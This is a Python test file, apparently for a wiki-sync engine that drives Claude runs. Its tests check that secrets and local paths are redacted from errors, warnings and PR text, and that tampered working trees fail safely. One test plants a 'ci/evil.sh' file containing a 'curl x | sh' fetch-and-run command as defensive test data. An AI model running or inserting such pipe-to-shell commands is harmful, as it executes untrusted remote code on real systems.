        async with env.stage(RUN_ID) as ctx:
            deps = dataclasses.replace(env.deps, redact=(SECRET,))
            s = await run_code_sync(dataclasses.replace(ctx, deps=deps))
        assert s.result == "failed"
        assert s.error is not None
        assert "Claude 실행을 검사할 수 없습니다" in s.error
        assert SECRET not in s.error
        assert SECRET not in s.summary
        assert not (env.paths.data_sync_dir / "wiki/index.md").exists()  # 되돌렸다
        assert read_tracking(env.paths.state_dir) == []

    async def test_실행_전_작업_사본_검사가_git_오류를_던져도_가린_메시지로_실패한다(
        self, tmp_dir: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        env = await make_sync_env(tmp_dir)

        async def broken(_git: GitClient) -> Any:
            raise GitError(f"status 실패 {SECRET}", kind="exit", code=128)

        monkeypatch.setattr("team_wiki_engine.sync.claude_step.changed_paths", broken)
        async with env.stage(RUN_ID) as ctx:
            deps = dataclasses.replace(env.deps, redact=(SECRET,))
            s = await run_code_sync(dataclasses.replace(ctx, deps=deps))
        assert s.result == "failed"
        assert s.error is not None
        assert SECRET not in s.error
        assert env.runner.inputs == []

    async def test_실패_detail의_비밀값은_자르기_전에_가린다(self, tmp_dir: Path) -> None:
        env = await make_sync_env(tmp_dir)
        opaque = "correcthorsebatterystaple"  # 토큰 모양이 아닌 알려진 비밀값
        detail = "가" * 285 + opaque + " 끝"  # 300자 경계에 걸친다
        env.runner.set_script(lambda _i, _c: {"ok": False, "failure": "error", "detail": detail})
        async with env.stage(RUN_ID) as ctx:
            deps = dataclasses.replace(env.deps, redact=(opaque,))
            s = await run_code_sync(dataclasses.replace(ctx, deps=deps))
        assert s.error is not None
        assert "correcth" not in s.error
        assert "correcth" not in s.summary

    async def test_변경분_경고도_가린다(
        self, tmp_dir: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        env = await make_sync_env(tmp_dir)

        async def noisy(**kwargs: Any) -> RepoDeltaResult:
            result = await real_compute_repo_delta(**kwargs)
            return RepoDeltaResult(result.delta, (*result.warnings, f"worker: API 실패 {SECRET}"))

        monkeypatch.setattr(PATCH + "compute_repo_delta", noisy)
        async with env.stage(RUN_ID) as ctx:
            deps = dataclasses.replace(env.deps, redact=(SECRET,))
            s = await run_code_sync(dataclasses.replace(ctx, deps=deps))
        assert s.result == "pr"
        assert any("API 실패" in w for w in s.warnings)
        assert all(SECRET not in w for w in s.warnings)
        assert SECRET not in local_pr_text(env)

    async def test_파일_오류_메시지는_경로_없이_종류만_싣는다(
        self, tmp_dir: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        env = await make_sync_env(tmp_dir)

        def broken(*_a: Any, **_k: Any) -> None:
            raise PermissionError(13, "거부", "/비밀/경로/state.json")

        monkeypatch.setattr(PATCH + "write_code_snapshot", broken)
        s = await run(env)
        assert s.result == "failed"
        assert s.error is not None
        assert "PermissionError" in s.error
        assert "/비밀/경로" not in s.error

    async def test_전달_뒤_상태_기록_실패도_경로_없이_경고만_남긴다(
        self, tmp_dir: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        env = await make_sync_env(tmp_dir)

        def broken(*_a: Any, **_k: Any) -> None:
            raise PermissionError(13, "거부", "/비밀/경로/gaps.jsonl")

        monkeypatch.setattr(PATCH + "mark_gaps_consumed", broken)
        seed_gap(env)
        s = await run(env)
        assert s.result == "pr"
        assert any("PermissionError" in w for w in s.warnings)
        assert all("/비밀/경로" not in w for w in s.warnings)

    async def test_열린_PR_스냅샷이_터무니없이_커도_빠르게_무시한다(self, tmp_dir: Path) -> None:
        env = await make_sync_env(tmp_dir)
        hostile = '{"worker": [' + ",".join(['"#1@2026-10-01"'] * 70000) + "]}"
        assert 1024 * 1024 * 0.9 < len(hostile) < 1024 * 1024 * 1.2
        (env.paths.state_dir).mkdir(parents=True, exist_ok=True)
        (env.paths.state_dir / STATE_FILES.open_pr_snapshot).write_text(hostile, encoding="utf-8")
        started = time.monotonic()
        s = await run(env)
        assert s.result == "pr"
        assert time.monotonic() - started < 60
        saved = json.loads((env.paths.state_dir / STATE_FILES.open_pr_snapshot).read_text("utf-8"))
        assert saved == {"worker": []}  # 기록이 정상 값으로 바뀌었다

    async def test_받지_못한_저장소의_지난_열린_PR_키는_이어_두어_변화로_보지_않는다(
        self, tmp_dir: Path
    ) -> None:
        gone = {"name": "gone", "url": str(tmp_dir / "nope.git")}
        env = await make_sync_env(tmp_dir, extra_repos=[gone])
        head = await rev_parse(env.code_work, "HEAD")
        base = {"repos": {"worker": {"commit": head, "archived": False}}}
        await push_data(env, {"baseline.json": json.dumps(base)}, "기준")
        write_json(
            env.paths.state_dir / STATE_FILES.open_pr_snapshot,
            {"worker": [], "gone": ["#7@2026-10-01T00:00:00Z"]},
        )
        s = await run(env)
        assert (s.result, s.summary) == ("no-change", "코드: 변경 없음")
        assert env.runner.inputs == []  # gone의 지난 키를 이어 두지 않으면 "변화"로 오인한다


# ---------------------------------------------------------------- 수정 2회차: 비밀값·경로 새기


OPAQUE = "correcthorsebatterystaple"  # 토큰 모양이 아닌 알려진 비밀값


def straddling_path(pad: int) -> str:
    """비밀값이 표시 경로의 300자 경계에 걸치는 허용 밖 경로(`raw/` 아래)."""
    long_dir = "d" * 100
    return f"raw/{long_dir}/{long_dir}/{'e' * (pad - 206)}{OPAQUE}.md"


def all_text(env: SyncEnv, s: StageResult) -> str:
    """운영 채널·PR 본문에 갈 수 있는 모든 글."""
    pieces = [s.error or "", s.summary, *s.warnings]
    if env.paths.local_prs_dir.exists():
        pieces += [p.read_text("utf-8") for p in env.paths.local_prs_dir.iterdir()]
    return "\n".join(pieces)


def assert_no_local_paths(env: SyncEnv, s: StageResult) -> None:
    text = all_text(env, s)
    assert str(env.root) not in text
    assert "/private/" not in text
    assert str(env.paths.home) not in text


class TestSecretsStraddlingPaths:
    @pytest.mark.parametrize("pad", [276, 288, 298, 300])
    async def test_Claude가_쓴_경로의_비밀값은_경계에_걸쳐도_조각이_없다(
        self, tmp_dir: Path, pad: int
    ) -> None:
        env = await make_sync_env(tmp_dir)

        def script(inp: RunClaudeInput, call: int) -> Mapping[str, Any] | None:
            result = default_script(inp, call)
            write_tree(inp.cwd, {straddling_path(pad): "x"})
            return result

        env.runner.set_script(script)
        async with env.stage(RUN_ID) as ctx:
            deps = dataclasses.replace(env.deps, redact=(OPAQUE,))
            s = await run_code_sync(dataclasses.replace(ctx, deps=deps))
        assert s.result == "failed"
        assert s.error is not None
        assert "허용 경로 밖 변경" in s.error
        assert "correcth" not in all_text(env, s)

    @pytest.mark.parametrize("pad", [276, 288, 298, 300])
    async def test_점검_수정_실행이_쓴_경로의_비밀값도_조각이_없다(
        self, tmp_dir: Path, pad: int
    ) -> None:
        env = await make_sync_env(tmp_dir)

        def script(inp: RunClaudeInput, call: int) -> Mapping[str, Any] | None:
            if inp.resume_session_id is not None:  # 점검 수정 실행이 허용 밖 경로를 쓴다
                write_tree(inp.cwd, {straddling_path(pad): "x"})
                return None
            result = default_script(inp, call)
            write_tree(inp.cwd, {"wiki/bad.md": BAD_PAGE})
            return result

        env.runner.set_script(script)
        async with env.stage(RUN_ID) as ctx:
            deps = dataclasses.replace(env.deps, redact=(OPAQUE,))
            s = await run_code_sync(dataclasses.replace(ctx, deps=deps))
        assert s.result == "failed"
        assert s.error is not None
        assert "correcth" not in all_text(env, s)


class TestLocalPathsDoNotLeak:
    async def test_a_받지_못한_저장소_경고에_경로가_없다(self, tmp_dir: Path) -> None:
        gone = {"name": "gone", "url": str(tmp_dir / "nope.git")}
        env = await make_sync_env(tmp_dir, extra_repos=[gone])
        s = await run(env)
        assert any(w.startswith("gone: 받아 오지 못해") for w in s.warnings)
        assert_no_local_paths(env, s)

    async def test_b_점유된_코드_사본_폴더_경고에_경로가_없다(self, tmp_dir: Path) -> None:
        other = {"name": "other", "url": str(tmp_dir / "worker.git")}
        env = await make_sync_env(tmp_dir, extra_repos=[other])
        (env.paths.repos_dir / "other").mkdir(parents=True)
        (env.paths.repos_dir / "other" / "stray.txt").write_text("x")
        s = await run(env)
        assert any(w.startswith("other: 받아 오지 못해") for w in s.warnings)
        assert_no_local_paths(env, s)

    async def test_c_git_잠금_오류의_stderr_경로가_없다(self, tmp_dir: Path) -> None:
        env = await make_sync_env(tmp_dir)
        await run(env)
        await env.merge_branch(f"sync/code-{RUN_ID}")
        await commit_files(env.code_work, {"src/B.kt": "class B"}, "B 추가")
        await env.code_work.run(["push", "-q", "origin", "main"])
        target = tmp_dir / "target.txt"
        target.write_text("x", encoding="utf-8")
        os.symlink(target, env.paths.repos_dir / "worker" / ".git" / "index.lock")  # 지울 수 없다
        s = await run(env, "20261008-0900")
        assert any(w.startswith("worker: 받아 오지 못해") for w in s.warnings)
        assert_no_local_paths(env, s)

    async def test_d_baseline_읽기_OSError_문구에_경로가_없다(
        self, tmp_dir: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        env = await make_sync_env(tmp_dir)
        target = env.paths.data_sync_dir / "baseline.json"

        def broken(_dir: Path) -> Any:
            raise PermissionError(13, "Permission denied", str(target))

        monkeypatch.setattr("team_wiki_engine.sync.stage.read_baseline", broken)
        s = await run(env)
        assert s.result == "failed"
        assert s.error is not None
        assert "baseline.json을 읽을 수 없습니다" in s.error
        assert_no_local_paths(env, s)

    async def test_e_작업_사본_상태_오류의_경로가_없다(self, tmp_dir: Path) -> None:
        env = await make_sync_env(tmp_dir)
        (env.paths.data_sync_dir / ".git" / "HEAD").unlink()
        s = await run(env)
        assert s.result == "failed"
        assert s.error is not None
        assert "<경로>" in s.error or "<data-sync>" in s.error
        assert_no_local_paths(env, s)

    async def test_상대_경로_메시지는_그대로다(self, tmp_dir: Path) -> None:
        env = await make_sync_env(tmp_dir)
        env.runner.set_script(lambda inp, _c: write_tree(inp.cwd, {"raw/x.md": "x"}))
        s = await run(env)
        assert s.error is not None
        assert "raw/x.md" in s.error


class TestOpenPrSnapshotAdapter:
    def test_열린_PR_키_목록은_1000개까지만_받는다(self) -> None:
        adapter = _OPEN_PRS_ADAPTER
        assert adapter.validate_python({"w": ["#1@t"] * 1000}) == {"w": ["#1@t"] * 1000}
        with pytest.raises(ValidationError):
            adapter.validate_python({"w": ["#1@t"] * 1001})

    def test_잘못된_항목이_많아도_첫_오류에서_멈춘다(self) -> None:
        tracemalloc.start()
        try:
            with pytest.raises(ValidationError):
                _OPEN_PRS_ADAPTER.validate_python({"w": [0] * 1000})
            peak = tracemalloc.get_traced_memory()[1]
        finally:
            tracemalloc.stop()
        assert peak < 100_000  # 오류를 모으면 항목마다 오류 객체가 생겨 훨씬 크다


# ---------------------------------------------------------------- Task 15 수정 1회차 (공용 관문)


class _OpenIdPort(_WarnPort):
    async def find_open(self, kind: Any) -> str | None:
        return f"{RUN_ID}-{OPAQUE}-code.md"


class TestSharedGate:
    async def test_확신이_낮은_부분의_절대_경로는_PR_본문에_없다(self, tmp_dir: Path) -> None:
        env = await make_sync_env(tmp_dir)

        def script(inp: RunClaudeInput, call: int) -> Mapping[str, Any] | None:
            default_script(inp, call)
            leak = f"{env.paths.repos_dir}/worker/src/A.kt, {env.paths.home}/state/x.json"
            return {"text": f"반영했습니다.\n\n## 확신이 낮은 부분\n- 읽은 곳 {leak}"}

        env.runner.set_script(script)
        s = await run(env)
        assert s.result == "pr"
        assert "읽은 곳" in local_pr_text(env)
        assert_no_local_paths(env, s)

    async def test_확신이_낮은_부분의_알려진_비밀값은_자르기_전에_가린다(
        self, tmp_dir: Path
    ) -> None:
        env = await make_sync_env(tmp_dir)

        def script(inp: RunClaudeInput, call: int) -> Mapping[str, Any] | None:
            default_script(inp, call)
            return {"text": f"반영했습니다.\n\n## 확신이 낮은 부분\n- 키 {OPAQUE} 를 봄"}

        env.runner.set_script(script)
        async with env.stage(RUN_ID) as ctx:
            deps = dataclasses.replace(env.deps, redact=(OPAQUE,))
            s = await run_code_sync(dataclasses.replace(ctx, deps=deps))
        assert s.result == "pr"
        assert "키" in local_pr_text(env)
        assert OPAQUE not in local_pr_text(env)

    async def test_열린_PR_번호에_든_알려진_비밀값도_요약에서_가린다(self, tmp_dir: Path) -> None:
        env = await make_sync_env(tmp_dir)
        assert env.deps.pr_port is not None
        deps = dataclasses.replace(
            env.deps, pr_port=_OpenIdPort(env.deps.pr_port, []), redact=(OPAQUE,)
        )
        async with env.stage(RUN_ID) as ctx:
            s = await run_code_sync(dataclasses.replace(ctx, deps=deps))
        assert s.result == "skipped-open-pr"
        assert "correcth" not in s.summary

    async def test_알려진_비밀값은_패턴이_아니어도_변경분_경고에서_가린다(
        self, tmp_dir: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        env = await make_sync_env(tmp_dir)

        async def noisy(**kwargs: Any) -> RepoDeltaResult:
            result = await real_compute_repo_delta(**kwargs)
            return RepoDeltaResult(result.delta, (*result.warnings, f"worker: API 실패 {OPAQUE}"))

        monkeypatch.setattr(PATCH + "compute_repo_delta", noisy)
        async with env.stage(RUN_ID) as ctx:
            deps = dataclasses.replace(env.deps, redact=(OPAQUE,))
            s = await run_code_sync(dataclasses.replace(ctx, deps=deps))
        assert s.result == "pr"
        assert "correcth" not in all_text(env, s)

    async def test_알려진_비밀값은_코드_사본_실패_경고에서도_가린다(self, tmp_dir: Path) -> None:
        gone = {"name": "gone", "url": str(tmp_dir / f"{OPAQUE}.git")}
        env = await make_sync_env(tmp_dir, extra_repos=[gone])
        async with env.stage(RUN_ID) as ctx:
            deps = dataclasses.replace(env.deps, redact=(OPAQUE,))
            s = await run_code_sync(dataclasses.replace(ctx, deps=deps))
        assert any("받아 오지 못해" in w for w in s.warnings)
        assert "correcth" not in all_text(env, s)


class TestDirtyTreeBeforeReapply:
    @pytest.mark.parametrize("mode", ["pr", "direct"])
    @pytest.mark.parametrize("variant", ["symlink", "rename", "outside-file"])
    async def test_기준_값_앞에서_사본이_더러우면_실패하고_아무것도_전달하지_않는다(
        self, tmp_dir: Path, monkeypatch: pytest.MonkeyPatch, variant: str, mode: str
    ) -> None:
        env = await make_sync_env(tmp_dir, review_mode="direct" if mode == "direct" else "pr")
        outside = tmp_dir / "outside.txt"
        outside.write_text("바깥", encoding="utf-8")
        data = env.paths.data_sync_dir
        main_before = (await bare_git(env.data_bare).run(["rev-parse", "main"])).text

        def dirty() -> None:
            if variant == "symlink":
                (data / "raw/.gitkeep").unlink()
                os.symlink(outside, data / "raw/.gitkeep")
            elif variant == "rename":
                (data / "raw/.gitkeep").rename(data / "raw/.gitkeep2")
            else:
                write_tree(data, {"ci/evil.sh": "curl x | sh\n"})

        async def all_(git: GitClient, message: str) -> str | None:
            result = await real_commit_all(git, message)
            if message.startswith("wiki: 코드 변경 반영"):
                dirty()
            return result

        async def paths_(git: GitClient, paths: Sequence[str], message: str) -> str | None:
            return await real_commit_paths(git, paths, message)

        monkeypatch.setattr(PATCH + "commit_all", all_)
        monkeypatch.setattr(PATCH + "commit_paths", paths_)
        s = await run(env)
        assert s.result == "failed"
        assert not env.paths.local_prs_dir.exists()
        log = (
            await env.deps.data_git.run(["log", "--raw", "--format=%s", "origin/main..HEAD"])
        ).text
        assert "120000" not in log
        assert "ci/evil.sh" not in log
        assert "\traw/" not in log
        assert (await bare_git(env.data_bare).run(["rev-parse", "main"])).text == main_before
